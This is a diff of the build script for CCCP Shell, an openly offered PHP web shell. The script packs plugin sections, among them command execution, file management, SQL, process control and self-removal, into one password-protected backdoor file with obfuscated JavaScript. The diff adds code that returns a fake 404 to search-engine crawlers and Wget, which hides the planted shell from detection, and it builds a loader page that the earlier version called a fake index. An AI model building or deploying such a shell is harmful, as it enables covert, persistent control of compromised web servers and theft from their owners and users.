@@ -1,113 +1,116 @@
 <?php
 
-$language = array('es', 'en');
-$plugins = array('connect', 'execute', 'filemanager', 'info', 'process', 'selfremove', 'sql');
 
-$theme = 'default';
 $charset = 'utf-8';
-$sPass = md5('cccpshell');
-
-
+$pass = 'cccpshell';
 
 
 
 
 
 $baseFolder = dirname(__file__);
-require "{$baseFolder}/base/config.php";
 require "{$baseFolder}/includes/jsPacker.php";
 require "{$baseFolder}/includes/tools.php";
 
 
-$rc4drop = mt_rand(23, 123);
-$config['rc4drop'] = $rc4drop;
+require "{$baseFolder}/base/config.php";
+$config['charset'] = $charset;
+$config['sPass'] = md5($pass);
+$config['rc4drop'] = mt_rand(23, 80);
+
+
+//base files
+$js  = file_get_contents("{$baseFolder}/base/base.js");
+$css = file_get_contents("{$baseFolder}/base/base.css");
+
+
+//sections
+$menu = '';
+$sections = '';
+foreach (glob("{$baseFolder}/sections/*.php") as $path) {
+    $info = pathinfo($path);
+    $plugin = $info['filename'];
+    $folder = "{$baseFolder}/sections/";
+    $name = ucwords($plugin);
+    $menu .= mLink("<b>{$name}</b>", 'ajaxLoad("me=' . $plugin . '")') . ' | ';
+
+    //plugins
+    $code = file_get_contents("{$folder}/{$plugin}.php");
+    if (!empty($sections)) {
+        $sections .= ' else ';
+    }
+
+    $sections .= "if (\$p['me'] === '{$plugin}') {
+        {$code}
+    }"; 
+
+    if (file_exists("{$folder}/{$plugin}.js")) {
+        $js .= file_get_contents("{$folder}/{$plugin}.js");
+    }
+
+    if (file_exists("{$folder}/{$plugin}.css")) {
+        $css .= file_get_contents("{$folder}/{$plugin}.css");
+    }
+}
+
+
+// termino de armar
+$defAction = "filemanager' . (isset(\$p['dir']) ? '&dir=' . rawurlencode(\$p['dir']) : '') . '";
+$menu .= mLink('<b>Logout</b>', 'if (confirm("Are you sure?")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}'); 
+$js = 'var config = ' . json_encode($config) . ";\n" . $js;
+
+
+// con esto arreglo el escapado en php y las secciones
+$menu = str_replace("'", "\'", $menu);
+$js = str_replace("'", "\'", $js);
+$sections = str_replace('<?php', '', $sections);
+
+
+// creo ultima seccion
+$js = packer_pack_js($js);
+$code = file_get_contents("{$baseFolder}/base/theme.php");
+$code = str_replace(
+    array('{{_JS_}}', '{{_CSS_}}', '{{_MENU_}}'), 
+    array($js, $css, $menu), 
+    $code
+);
+
+$sections .= " else if (\$p['me'] === 'loader') {
+    \$defAction = 'ajaxLoad(\"me={$defAction}\")';
+    \$loader = '{$code}';
+
+    sAjax(\$loader);
+}"; 
+
+
+// termino de procesar el codigo php
+$sections = packer_strips($sections);
+$php = file_get_contents("{$baseFolder}/base/helpers.php");
+$php .= file_get_contents("{$baseFolder}/base/zip.php");
+$php = str_replace('<?php', '', $php);
+$php = packer_strips($php);
+
+
+// creo loader
+$loaderJs = file_get_contents("{$baseFolder}/base/loader.js");
+$loaderJs = packer_pack_js($loaderJs);
+$loaderHtml = file_get_contents("{$baseFolder}/base/loader.php");
+$loader = str_replace('{{_JS_}}', $loaderJs, $loaderHtml);
+
+
+// se fini
 $timestamp = date($config['datetime'], time());
-
-function tText($id, $def){
-	
-	if (isset($lang[$id])) return $lang[$id];
-	else return $def;
-}
-
-
-//base functions
-$baseCode = file_get_contents("{$baseFolder}/base/php.php");
-require "{$baseFolder}/base/js.php";
-$themeJS = $code;
-$themeCSS = file_get_contents("{$baseFolder}/themes/{$theme}/css.css");
-
-//plugins
-$genMenu = '';
-$genPlugins = '';
-foreach ($plugins as $plugin) {
-	$folder = "{$baseFolder}/plugins/{$plugin}";
-
-	if (file_exists("{$folder}/php.php")) {
-		require "{$folder}/php.php";
-
-		//menu
-		$genMenu .= mLink("<b>{$tText}</b>", 'ajaxLoad("me=' . $plugin . '")') . ' | ';
-
-		//plugins
-		if (!empty($genPlugins))
-			$genPlugins .= ' else ';
-
-		$genPlugins .= "if (\$p['me'] === '{$plugin}') {
-			{$code}
-		}";	
-	}
-
-	if (file_exists("{$folder}/js.php")) {
-		require "{$folder}/js.php";
-		$themeJS .= $code;
-	}
-
-	if (file_exists("{$folder}/css.css")) {
-		$themeCSS .= file_get_contents("{$folder}/css.css");
-	}
-}
-
-//default action
-if (in_array('filemanager', $plugins)) {
-	$defAction = "filemanager' . (isset(\$p['dir']) ? '&dir=' . rawurlencode(\$p['dir']) : '') . '";
-} else {
-	$defAction = "{$plugins[0]}";
-}
-
-//theme
-$themeJS = packer_pack_js($themeJS);
-$themeJS = str_replace("'", "\'", $themeJS);
-
-$genMenu .= mLink('<b>' . tText('logout', 'Logout') . '</b>', 'if (confirm("' . tText('merror', 'Are you sure?') . '")) {sessionStorage.clear();hash="";d.getElementsByTagName("html")[0].innerHTML="";}');	
-$genMenu = str_replace("'", "\'", $genMenu);
-
-$code = file_get_contents("{$baseFolder}/themes/{$theme}/theme.html");
-$code = str_replace(array('{{_JS_}}', '{{_CSS_}}', '{{_MENU_}}'), array($themeJS, $themeCSS, $genMenu), $code);
-
-$genPlugins .= " else if (\$p['me'] === 'loader') {
-	\$defAction = 'ajaxLoad(\"me={$defAction}\")';
-	\$loader = '{$code}';
-
-	sAjax(\$loader);
-}";	
-
-//$genPlugins = packer_strips($genPlugins);
-$themeJS = file_get_contents("{$baseFolder}/themes/{$theme}/fake-js.js");
-$themeJS = packer_pack_js($themeJS);
-$code = file_get_contents("{$baseFolder}/themes/{$theme}/fake.html");
-$fakeIndex = str_replace('{{_JS_}}', $themeJS, $code);
-
 
 $shell = "<?php
 /*
  * CCCP Shell
  * by DSR!
  * https://github.com/xchwarze/CCCPShell
- * v 1.0.0 build: {$timestamp}
+ * v 1.1.0 build: {$timestamp}
  */
 
 # System variables
-\$config['charset'] = '{$charset}'; //'utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'
+\$config['charset'] = '{$config['charset']}'; //'utf-8', 'big5', 'gbk', 'iso-8859-2', 'euc-kr', 'euc-jp'
 \$config['date'] = '{$config['date']}';
 \$config['datetime'] = '{$config['datetime']}';
 \$config['hd_lines'] = {$config['hd_lines']};   //lines in hex preview file
@@ -116,23 +119,35 @@ $shell = "<?php
 \$config['SQLLimit'] = {$config['SQLLimit']};   //sql manager result limit.
 \$config['checkBDel'] = true;//Check Before Delete: true = On 
 \$config['consNames'] = array('post'=>'dsr', 'slogin'=>'cccpshell', 'sqlclog'=>'conlog'); //Constants names
-\$config['sPass'] = '{$sPass}'; // md5('cccpshell')
-\$config['rc4drop'] = {$rc4drop};  //drop size
+\$config['sPass'] = '{$config['sPass']}'; // md5(pass)
+\$config['rc4drop'] = {$config['rc4drop']};  //drop size
 
 
 // ------ Start CCCPShell
-{$baseCode}
+{$php}
 
+\$sBuff = '';    
+\$p = getData();
+
+
+# Sections
 if (isset(\$p['me'])) {
-	{$genPlugins}
+    {$sections}
 }
 
 #Se fini
-if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) && \$_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest')
-	sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4)));
-	//sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4) . ' Mem Peak: ' . sizecount(memory_get_peak_usage(false)) . ' Men: ' . sizecount(memory_get_usage(false))) );
+if (isset(\$_SERVER['HTTP_X_REQUESTED_WITH']) && \$_SERVER['HTTP_X_REQUESTED_WITH'] === 'XMLHttpRequest') {
+    sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4)));
+    //sAjax(\$sBuff . mHide('etime', substr((microtime(true) - \$loadTime), 0, 4) . ' Mem Peak: ' . sizecount(memory_get_peak_usage(false)) . ' Men: ' . sizecount(memory_get_usage(false))) );
+} else {
+    \$uAgents = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Yahoo', 'Zeus', 'bot', 'Wget');
+    if (empty(\$_SERVER['HTTP_USER_AGENT']) || preg_match('/' . implode('|', \$uAgents) . '/i', \$_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
+}
 ?>
-{$fakeIndex}";
+{$loader}";
 
 
 
